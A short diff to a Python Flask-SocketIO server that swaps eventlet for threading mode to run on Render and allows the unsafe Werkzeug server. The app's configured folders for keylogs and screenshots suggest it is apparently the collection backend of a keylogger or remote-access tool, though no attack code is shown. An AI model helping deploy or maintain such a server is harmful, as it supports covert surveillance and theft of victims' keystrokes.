@@ -63,13 +63,13 @@ for folder in [app.config['UPLOAD_FOLDER'], app.config['KEYLOG_FOLDER'],
                app.config['SCREENSHOT_FOLDER'], app.config['FILE_STORAGE']]:
     os.makedirs(folder, exist_ok=True)
 
-# SocketIO - Using eventlet for Render compatibility
+# SocketIO - Using threading for Render compatibility
 socketio = SocketIO(
     app,
     cors_allowed_origins="*",
     logger=True,
     engineio_logger=False,
-    async_mode='eventlet',
+    async_mode='threading',
     ping_timeout=60,
     ping_interval=25
 )
@@ -720,12 +720,12 @@ if __name__ == '__main__':
     
     logger.info(f"Starting server on 0.0.0.0:{port}")
     
-    # Use eventlet for Render
+    # Use threading mode for Render
     socketio.run(
         app,
         host='0.0.0.0',
         port=port,
         debug=False,
         use_reloader=False,
-        log_output=True
+        allow_unsafe_werkzeug=True
     )
